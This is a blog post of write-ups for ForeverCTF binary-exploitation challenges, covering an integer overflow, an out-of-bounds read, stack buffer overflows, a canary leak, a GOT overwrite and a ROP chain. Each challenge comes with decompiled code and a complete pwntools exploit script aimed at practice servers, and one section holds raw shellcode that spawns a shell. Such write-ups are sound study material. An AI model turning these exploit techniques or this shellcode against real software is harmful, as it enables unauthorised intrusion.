---
layout: post
title: ForeverCTF Write-ups
---

## Pwn

### uint64_t

This was a pretty simply integer overflow. The program prompts us that we have 100000 yen and three choices and continuously prompts us on a loop.
```
Your current balance is: 100 bityen

You may perform the following actions: 
1.   Spend 3 bityen -- show me doge
2.   Spend 100,000 bityen -- win
3.   Earn 1 bityen -- answer a math question

What will you do next?
```

I manually spent down until the bityen count wrapped and entered 2 to win, but doing that would be no fun on the server so I wrote a script to do it for me.
```python
#!/usr/bin/env python3

from pwn import *

r = remote('forever.isss.io', 9018)
yen = 100

for _ in range(34):
    r.recvuntil(b'What will you do next? ')
    r.sendline(b'1')
    yen -= 3
    print(f'You now have {yen} yen')

r.recvuntil(b'What will you do next? ')
r.sendline(b'2')

r.interactive()
```

### Tricky Indices

Another stright forward challenge. The program prompts us for a string and two numbers that serve as indices for out string.
```
Input a string:
asdf
Input a first index:
4
Input a second index:
5
4 5
```

Unforunately, the program fails to check if the second index given as input is within the bounds of the s```char``` array and allows us to see the flag that is read in at the beginning of the program.
```
00001209  int32_t main(int32_t argc, char** argv, char** envp)

00001218      void* fsbase
00001218      int64_t rax = *(fsbase + 0x28)
00001227      int64_t var_e8
00001227      __builtin_memset(s: var_e8, c: 0, n: 0x64)
000012e2      fgets(buf: &var_e8, n: 0x64, fp: fopen(filename: "flag.txt", mode: &data_2004))
000012e7      int64_t var_78
000012e7      __builtin_memset(s: var_78, c: 0, n: 0x64)
00001355      puts(str: "Input a string:")
0000136d      __isoc99_scanf(format: &data_201f, &var_78)
00001379      puts(str: "Input a first index:")
00001394      int32_t var_fc
00001394      __isoc99_scanf(format: &data_2037, &var_fc)
000013a0      puts(str: "Input a second index:")
000013bb      int32_t var_f8
000013bb      __isoc99_scanf(format: &data_2037, &var_f8)
000013da      printf(format: "%d %d\n", zx.q(var_fc), zx.q(var_f8))
00001417      for (int32_t var_f4 = var_fc; var_f4 s< var_f8; var_f4 = var_f4 + 1)
000013ff          putchar(c: sx.d(*(&var_78 + sx.q(var_f4))))
0000141e      putchar(c: 0xa)
00001435      if (rax == *(fsbase + 0x28))
0000143d          return 0
00001437      __stack_chk_fail()
00001437      noreturn
```

All we need to do is input a sufficiently large second index and we can read the flag right off the stack. By looking at the disassembly, we see that our input is at address ```rbp-0x70``` and the flag is at address ```ebp-0xe0```. Our flag is actually below our input on the stack by 112 bytes, so we need to use some negative index magic to get us the flag.
```python
#!/usr/bin/env python3

from pwn import *

p = remote('forever.isss.io', 1301)

payload1 = b'qwerty'
payload2 = b'-112'
payload3 = b'-70'

p.recvline()
p.sendline(payload1)
p.recvline()
p.sendline(payload2)
p.recvline()
p.sendline(payload3)

out_buf = p.recvall()
print(f"The output is {len(out_buf)} chars long")
print("Type: " + str(type(out_buf[1])))
flag_buf = ""
for i in range(len(out_buf)):
    if int(out_buf[i]) <= 125 and int(out_buf[i]) >= 33:
        flag_buf += chr(out_buf[i])
    else:
        flag_buf += '.'

print(flag_buf)
p.interactive()
```

### Overflow

Our first buffer overflow challenge! The program is extremely simple and simply asks us for input.
```
Enter some input!

```

With any buffer overflow, I like to check the file protections to see what is possible and it looks like the world is out oyster except with shellcode injection.
```
└─$ checksec --file=overflow
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   66 Symbols	  No	0		1		overflow
```

In the decompilation, we see that the program uses the ever feared ```gets()``` function to recieve our iput. We also see that there is a function called ```get_flag```that is not called in ```main``` which opens us a shell. That will be the address we return to. 

By using the trusty ```pwndbg```, we can set a break point at the return instruction and use the ```cyclic`` and ```cyclic -l``` commands to get our offset which in this case is 120. After that, we just copy and paste the ```get_flag``` function address right from binary ninja.
```python
#!/usr/bin/env python3

from pwn import *

flag_func = 0x00401176
offset = 120

payload = b'A'*offset + p64(flag_func)

r = remote('forever.isss.io', 1302)

r.recvline()
r.sendline(payload)

r.interactive()
```

### Jump

This is pretty much the same challenge as Overflow, so I wil simply show the exploit.
```python
#!/usr/bin/env python3

from pwn import *

flag_func = 0x004011c7
offset = 120

payload = b'A'*offset + p64(flag_func)

r = remote('forever.isss.io', 1303)

r.recvline()
r.sendline(payload)

r.interactive()
```

### Sally Sells Shells

From the name of this challenge, I can already guess this is a shellcode injection challenge. Running the program shows us no prompt and simply crashes upon entering any value. If we use ```checksec```, we can see that the NX bit is disabled, which points to our original presumption.
```
└─$ checksec --file=shellysellsshells 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   66 Symbols	  No	0		1		shellysellsshells
```

Upon looking at the decompilation, we are proven right. The program calls our input as a function pointer.
```
00001169  int32_t main(int32_t argc, char** argv, char** envp)

00001178      void* fsbase
00001178      int64_t rax = *(fsbase + 0x28)
00001196      void var_208
00001196      gets(buf: &var_208)
000011a7      (&var_208)()
000011bb      if (rax == *(fsbase + 0x28))
000011c3          return 0
000011bd      __stack_chk_fail()
000011bd      noreturn
```

Since writing shellcode is something I still need to work on, I simply copy and pasted some shellcode from the internet which did the trick.
```python
#!/usr/bin/env python3

from pwn import *

sc = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

r = remote('forever.isss.io', 1305)

r.sendline(sc)

r.interactive()
```

### Params

This challenge caused me a lot of frustration, but for an incredibly silly reason that you will see soon. The program prompts us for a name and gives us the option to set the registers to any value. If we look at ```checksec``` we see no pie or canary, but there is a NX bit, so no shellcode.

Upon inspection of the decompilation, it does exactly what we were expecting. It uses the ```gets()``` function to read our input, so obvious overflow opportunity, and then reads our input into the registers at integers. Now, for the embarassing part, I did not notice the ```get_flag``` function at first, and spent an incredible amount of time trying to do a ```execve``` call which is imported by the linker.
```
004011b6  int32_t main(int32_t argc, char** argv, char** envp)

004011c9      puts(str: "hey bb")
004011d5      puts(str: "whats ur name")
004011e6      void var_48
004011e6      gets(buf: &var_48)
004011fe      printf(format: "hey %s\n", &var_48)
0040120a      puts(str: "you can set my registers any day…")
00401237      int64_t var_78
00401237      __builtin_memset(s: var_78, c: 0, n: 0x30)
0040124b      printf(format: "rax: ")
00401263      int64_t var_50
00401263      __isoc99_scanf(format: &data_40205b, &var_50)
00401274      printf(format: "rbx: ")
0040128c      int64_t var_58
0040128c      __isoc99_scanf(format: &data_40205b, &var_58)
0040129d      printf(format: "rcx: ")
004012b5      int64_t var_60
004012b5      __isoc99_scanf(format: &data_40205b, &var_60)
004012c6      printf(format: "rdx: ")
004012de      int64_t var_68
004012de      __isoc99_scanf(format: &data_40205b, &var_68)
004012ef      printf(format: "rsi: ")
00401307      int64_t var_70
00401307      __isoc99_scanf(format: &data_40205b, &var_70)
00401318      printf(format: "rdi: ")
00401330      __isoc99_scanf(format: &data_40205b, &var_78)
00401353      return 0
```

And for the ```get_flag()``` function:
```
00401354  void get_flag(int64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4)

00401395      if (arg1 == 0x1337 && arg2 == 0xcafebabe && arg3 == 0xdeadbeef && arg4 == 4)
0040139e          void* const var_18 = "/bin/sh"
004013a2          int64_t var_10_1 = 0
004013bd          execve("/bin/sh", &var_18, 0, &var_18)
```

All we need to do is setup the registers with the required values. Since this is 64 bit, we need to put arg1 in ```rdi```, arg2 in ```rsi```, arg3 in ```rdx```, and arg4 in ```rcx```. If this was 32 bit, we would need to push the arguments onto the stack before calling the function. So without further ado, the exploit:
```
#!/usr/bin/env python3

from pwn import *

get_flag_addr = 0x00401354
offset = 72

r = remote('forever.isss.io', 1304)

payload = b'A'*72 + p64(get_flag_addr)
rdi = p64(0x1337)
rsi = p64(0xcafebabe)
rdx = p64(0xdeadbeef)
rcx = 4
null = p64(0x00)

r.sendline(payload)
r.sendline(b'0')
r.sendline(b'0')
r.sendline(b'4')
r.sendline(b'3735928559')
r.sendline(b'3405691582')
r.sendline(b'4919')

r.interactive()
```

### Canary in a Coalmine

Now I wonder what we might see with this one? If you guessed some canary shenanigans, you would be correct. Looking at ```checksec```, we see that there is indeed a canary, but at least PIE is disabled so it is much easier to work with.
```
└─$ checksec --file=canary 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols	  No	0		1		canary
```

Running the program, it prompts us for the length of our answer, an input, and a second input.
```
What is the capital of Canada?
What is the length of your answer?
1234
Give me your answer
asdf
Your answer is:
asdf��zXH`��X�E�X9QzX`��X��yXX�4��@�4�����]�S@�4��4@��tX@X�4��X�4���ad{tpo�h�4�� `�X�aƏ���a��E�tX@X0@P�4��^@H�4��8�5���5��65��d5���5���5���5���5�5��55��e5���5���5���5���5��5��.5��Q5���5���5���5���5��5��5��C5��V5��g5��t5���5���5���5��5��5��'5��<5���5���5���5��5��M5��o5���5���5���@�X�5���0@��5���5��5��5��)5��A5��V5��o5���5���5���5��!`>��3����d@@8
          �
����4����5����4����]�S�
Want to change your answer?
Here is a second try
asdf
Still wrong! Nerd
```

It clearly prints out some wacky values, which I assume is a loop that uses our first length input as the loop terminator.

If we open the decompilation, we see that ```main``` simply calls a function called ```vuln``` which proeves our presumtion right. The program indeed uses our first input as the loop terminator.
```
00401216  int64_t vuln()

00401222      void* fsbase
00401222      int64_t rax = *(fsbase + 0x28)
00401238      puts(str: "What is the capital of Canada?")
00401244      puts(str: "What is the length of your answe…")
0040125c      int32_t var_80
0040125c      __isoc99_scanf(format: &data_40204b, &var_80)
00401261      getchar()
0040126d      puts(str: "Give me your answer")
0040127e      void var_78
0040127e      gets(buf: &var_78)
0040128a      puts(str: "Your answer is:")
004012b6      for (int32_t var_7c = 0; var_7c s< var_80; var_7c = var_7c + 1)
004012a7          putchar(c: sx.d(*(&var_78 + sx.q(var_7c))))
004012bd      putchar(c: 0xa)
004012c9      puts(str: "Want to change your answer?")
004012d5      puts(str: "Here is a second try")
004012e6      gets(buf: &var_78)
004012f2      puts(str: "Still wrong! Nerd")
004012fc      int64_t rax_11 = rax ^ *(fsbase + 0x28)
00401305      if (rax_11 == 0)
0040130d          return rax_11
00401307      __stack_chk_fail()
00401307      noreturn
```

There is also a function symbol for a ```get_flag``` function which spawns us a shell.

Gameplan is to leak the canary value using the length input and construct a second payload that will be delivered as the third input. First we need to find the offset to the canary.

The canary is stored on the stack at ```rbp-0x8``` and our input is at ```rbp-0x70```. So our offset is ```0x70 - 0x8 = 104```. Now, for reasons I still don't quite understand, this offset was actually 120. It took a lot of fiddling with the script to get it to return the canary value.

Now we need to find the offset of the return address. If we bust our ```pwndbg``` and use the ```cyclic``` and ```cyclic -l``` combo after setting a breakpoint at the return instruction, we see that the offset is 120. Now we have all the information we need.
```python
#!/usr/bin/env python3

from pwn import *

e = ELF('./canary')

get_flag_addr = p64(e.symbols['get_flag'])

r = remote('forever.isss.io', 1308)
#r = gdb.debug('./canary', '''
#              b *0x00000000004012f2
#              continue
#              ''')

r.recvline()
r.recvline()
r.sendline(b'130')
r.recvline()
r.sendline(b'leak_canary')
canary = u64(r.recv(numb=130)[120:120+8])
print(hex(canary))

payload = b'A'*104 + p64(canary) + p64(0x00) +  get_flag_addr

r.recvline()
r.recvline()
r.sendline(payload)
r.recvline()
r.interactive()
```

### Get My Got

This challenge is centered around the procedure linkage table and the global offset table.

When we check the file type, we see that it is a 64-bit, dynamically linked, and not stripped.
```
getmygot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c6ef3b5b912639ef8ed0b69e607a84a1b73bf5f6, for GNU/Linux 3.2.0, not stripped
```

File protections show that there is a canary with NX enabled. 
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   67 Symbols	  No	0		0		getmygot
```

When we run the binary, we are just prompted for two inputs.

#### Reversing

The vulnerability is clear as day in this challenge. The program simply takes a ```long``` as input and used as a pointer. The second input is another ```long``` that is used as the value stored at the address pointed to by the first input.
```
004011f3  int32_t main(int32_t argc, char** argv, char** envp)

004011ff      void* fsbase
004011ff      int64_t rax = *(fsbase + 0x28)
00401215      puts(str: "Can you get my got?")
00401221      puts(str: "Probably not tbh...")
00401239      int64_t* var_20
00401239      __isoc99_scanf(format: &data_402034, &var_20)
00401251      int64_t var_18
00401251      __isoc99_scanf(format: &data_402034, &var_18)
00401261      *var_20 = var_18
0040126b      puts(str: "Guess you failed")
00401282      if (rax == *(fsbase + 0x28))
0040128a          return 0
00401284      __stack_chk_fail()
00401284      noreturn
```

There is a win function called ```get_flag()```. With a canary, a simple ```ret2win``` solution is probably not the ticket. What we can do is use a GOT entry for puts and replace it with the address for ```get_flag()```.

#### Procedure Linkage Table and Global Offset Table

The Procedure Linkage Table (PLT) and Global Offset Table (GOT) are data structures used in dynamic linking. When the program is compiled with dynamic linking, external functions are not copied into the binary directly. Instead, they are "linked" into the binary using these two data structures.

The first time a binary calls a library function, it checks the procedure linkage table. The procedure linkage table will contain a pointer to an entry in the global offset table. If it is the first time the binary is calling this library function, the global offset table will simply point back to the procedure linkage table entry for that function in order to invoke the subroutine to locate that function address in memory. Once it is found, the global offset table entry is updated with the library function address and program execution is transferred to the library function.

This can be exploitable in a number of ways, but all of them rely on replacing the PLT entry with the global offset table entry of choice.

#### Pwn

The solution is pretty straightforward with ```pwntools```. Running the following script yields the flag.
```python
#!/usr/bin/env python3

from pwn import *


target = remote('forever.isss.io', 1307)
#target = gdb.debug('./getmygot', '''
#                   b *0x0000000000401239
#                   continue
#                   ''')

e = ELF('./getmygot')

payload1 = str(e.got['puts'])
payload2 = str(e.symbols['get_flag'])

target.recvline()
target.recvline()
target.sendline(payload1)
target.sendline(payload2)

target.interactive()
```

### rop

First we need to check the file type.
```
rop: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=a21aca21e741cb489157fd548b8cad8de5f8a439, for GNU/Linux 3.2.0, not stripped
```

Then the file protections.
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1882 Symbols	  No	0		0		rop
```

Running the program writes a prompt to the screen, takes input, and then echoes it back.

#### Reversing

The program is very straightforward and simple uses our favorite function ```gets()``` and saves it to a variable. With no canary, gaining control of rip is as simple as overwriting rip.
```
00401d65  int64_t main()

00401d78      _IO_puts("hey bb")
00401d84      _IO_puts("whats ur name")
00401d95      void var_48
00401d95      _IO_gets(&var_48)
00401dad      _IO_printf("hey %s\n", 0)
00401db9      _IO_puts("see ya!")
00401dc4      return 0
```

We also have a win function that takes three parameters.
```
00401dc5  void get_flag(int64_t arg1, int64_t arg2, int64_t arg3)
```

#### Pwn

Going off the name of the challenge, we are going to use a nice ROP chain to invoke ```get_flag()```. The 64-bit calling convention for functions is the first parameter is stored in ```rdi```, the second in ```rsi```, and the third in ```rdx```. We just need a rop gadget for each of these, and we can simply chain them together.
```
#!/usr/bin/env python3

from pwn import *

offset = 72
get_flag_addr = 0x401dc5
arg1 = 0x1337
arg2 = 0xcafebabe
arg3 = 0xdeadbeef

# pop rdi; ret;
pop_rdi = 0x00000000004018c2 

# pop rsi; ret;
pop_rsi = 0x000000000040f23e

# pop rdx; ret;
pop_rdx = 0x00000000004017cf

target = remote('forever.isss.io', 1306)
#target = gdb.debug('./rop', '''
#                   b *0x0000000000401dc4
#                   continue
#                   ''')

payload = (b'A'*offset) + p64(pop_rdi) + p64(arg1) + p64(pop_rsi) + p64(arg2) + p64(pop_rdx) + p64(arg3) + p64(get_flag_addr)

target.recvline()
target.recvline()
target.sendline(payload)

target.interactive()
```

Running this script yields the flag.


